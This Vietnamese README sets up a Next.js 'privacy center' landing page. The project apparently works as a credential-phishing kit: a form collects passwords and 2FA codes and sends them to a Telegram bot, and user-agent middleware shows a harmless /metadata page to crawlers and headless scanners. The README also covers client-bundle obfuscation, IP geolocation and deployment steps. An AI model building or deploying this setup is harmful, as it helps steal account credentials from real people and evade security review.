# Code_link — Landing Next.js (Saas UI + Chakra)

Ứng dụng landing page xây dựng trên [Next.js App Router](https://nextjs.org/docs/app), giao diện [Chakra UI](https://chakra-ui.com/) và [Saas UI](https://saas-ui.dev). Template gốc lấy cảm hứng từ [Saas UI Next.js landing](https://saas-ui-nextjs-landing-page.netlify.app/); repo này đã mở rộng thêm state, API route, middleware và một số tiện ích bảo vệ build.

## Yêu cầu

- **Node.js**: khuyến nghị LTS (18.x trở lên, tương thích Next.js 14).
- Trình duyệt hiện đại (ES modules).

## Công nghệ chính

| Thành phần | Vai trò |
|------------|---------|
| **Next.js 14** (App Router) | Routing, SSR/SSG, API Routes |
| **React 18** | UI |
| **TypeScript** | Kiểu tĩnh |
| **Chakra UI 2** + **Emotion** | Hệ thống component & styling |
| **Saas UI** | Component marketing / layout theo template |
| **Redux Toolkit** + **React Redux** | State toàn cục (ví dụ bước form) |
| **Tailwind CSS 3** + **PostCSS** | Utility CSS bổ sung |
| **Sass** | Một số stylesheet tùy biến |
| **Framer Motion** | Animation |
| **react-hook-form**, **react-google-recaptcha**, **react-phone-input-2** | Form, captcha, SĐT |
| **next-seo** | Metadata / SEO hỗ trợ |
| **axios**, **date-fns** | HTTP client, ngày tháng |

**Build production:** `next.config.mjs` gắn **webpack-obfuscator** cho bundle phía client (không dev, không server) — làm rối chuỗi, tắt `console` trên bản build, v.v.

## Scripts

Trong thư mục gốc `Code_link`:

```bash
npm install
npm run dev      # http://localhost:3000
npm run build    # production build
npm run start    # chạy server sau build
npm run lint     # ESLint (next/core-web-vitals)
```

Dự án có `package-lock.json`; nếu bạn dùng **pnpm** hoặc **yarn**, vẫn chạy được nhưng nên thống nhất một công cụ lockfile cho team.

## Cấu trúc thư mục (tóm tắt)

```
app/
  (marketing)/          # Nhóm route marketing — landing chính
  [slug]/               # Route động theo slug (một trang + metadata riêng)
  metadata/             # Trang dùng cho rewrite khi middleware phát hiện bot
  privacy-center/       # Trang / luồng privacy center
  api/
    ip-location/        # GET — tra cứu thông tin IP (proxy qua ip-api.com)
    privacy-center/     # POST — nhận JSON form (HTTPS), chuẩn hoá field, gửi Telegram
  store/                # Redux store, provider, slice (vd. stepFormSlice)
components/             # Hero, pricing, FAQ, modals, nav, SEO, v.v.
data/                   # Cấu hình site, legal-links (URL chính thức), pricing, faq, …
theme/                  # Theme Chakra / foundations
utils/                  # mask, sendData, memoryStore, generateKey, …
hooks/                  # use-scrollspy, use-route-changed
helper/                 # telegram.ts — gửi tin nhắn Bot API
middleware.ts           # Phân loại UA → rewrite bot sang /metadata
public/                 # favicon, static assets, CSS tùy biến
posts/                  # Nội dung MDX (nếu dùng cho blog/docs)
```

## Chỉnh nội dung & branding

- **`data/config.tsx`**: logo, SEO mặc định (`Metadata`), link header/footer, signup copy, v.v.
- **`data/pricing.tsx`**, **`data/faq.tsx`**, **`data/testimonials.tsx`**: bảng giá, FAQ, đánh giá.
- **`components/seo/seo.tsx`**: tích hợp SEO bổ sung nếu cần.

Sửa xong chạy `npm run dev` — hot reload cập nhật theo file trong `app/` và `components/`.

## Middleware (`middleware.ts`)

- Matcher áp dụng cho hầu hết đường dẫn, **trừ** `_next`, `api`, `favicon.ico`, `robots.txt`, `sitemap.xml` và các path có dấu chấm (file tĩnh).
- **Không rewrite** các prefix: `/_next`, `/api`, `/metadata`, và path chứa `.`.
- Dựa trên **User-Agent** và một số header (`Accept`, `Accept-Language`, …), logic phân loại **bot / headless / client HTTP đáng ngờ**. Nếu khớp → **rewrite** request sang **`/metadata`** (để crawler không đi vào cùng nội dung với người dùng thật — tùy chiến lược SEO/bảo mật của bạn).

## API Routes

| Endpoint | Phương thức | Mô tả ngắn |
|----------|-------------|------------|
| `/api/ip-location?ip=...` | GET | Trả JSON từ `http://ip-api.com/json/{ip}`; thiếu `ip` → 400. |
| `/api/privacy-center` | POST | Body JSON `{ "form": { ... } }` — chỉ các field cho phép (`parse-form.ts`), giới hạn độ dài; server gọi `sendTelegramMessage`. Dữ liệu nhạy cảm chỉ nên truyền qua **HTTPS**; có thể bổ sung rate limit / CAPTCHA server-side nếu cần. |

## Biến môi trường

Tạo file **`.env.local`** (không commit secret):

| Biến | Bắt buộc | Ý nghĩa |
|------|----------|---------|
| `TELEGRAM_BOT_TOKEN` | Có (nếu dùng API gửi Telegram) | Token bot từ [@BotFather](https://t.me/BotFather) |
| `TELEGRAM_CHAT_ID` | Có (nếu dùng API gửi Telegram) | Chat ID nhận tin |
| `NEXT_PUBLIC_SETTING_TIME` | Không | Số giây countdown (mặc định 30) — dùng trong luồng 2FA modal |

**Lưu ý bảo mật:** không commit `.env` hay token Telegram; dùng `.env.example` làm mẫu. Luồng form gửi JSON qua TLS — vẫn nên giới hạn tần suất (rate limit), log tối thiểu, và cân nhắc xử lý mật khẩu/2FA theo chính sách sản phẩm (không lưu plain text nếu không bắt buộc).

## Provider gốc (`app/layout.tsx`)

Thứ tự bọc tương tự: **Chakra `Provider`** → **Redux `ReduxProvider`** → **`LocationBootstrap`** → `children`. Font biến thể (Inter), global CSS, SCSS checkbox tùy biến.

## Deploy

- **Node / Docker / VPS:** `npm run build` rồi `npm run start`; cấu hình biến môi trường trên host.
- Obfuscation client chỉ bật khi **không** `NODE_ENV=development` trong bước webpack client — kiểm tra log build nếu plugin gây xung đột với thư viện mới.

### Vercel (preset Next.js)

Repo có Next.js trong thư mục **`Code_link`** (`package.json` + `package-lock.json` nằm ở đó).

**Bắt buộc trên Vercel:** **Project → Settings → General → Root Directory** = `Code_link` (đúng chữ hoa/thường như trong repo). File **`Code_link/vercel.json`** chỉ định `npm ci` và `npm run build` — chúng chạy trong thư mục root của project (tức `Code_link`), nên `package-lock.json` luôn được nhận đúng.

**Không** đặt Root Directory trống rồi cố cài bằng `npm ci --prefix Code_link` khi UI đã trỏ vào `Code_link`: hai cấu hình chồng nhau dễ khiến `npm ci` chạy nhầm chỗ và báo lỗi kiểu *npm-shrinkwrap / package-lock*.

Luôn commit `Code_link/package-lock.json` (bắt buộc cho `npm ci`).

## Tài liệu tham khảo

- [Saas UI Docs](https://saas-ui.dev/docs)
- [Next.js Documentation](https://nextjs.org/docs)
- [Chakra UI v2](https://v2.chakra-ui.com/)

## License

MIT
"# check_link" 
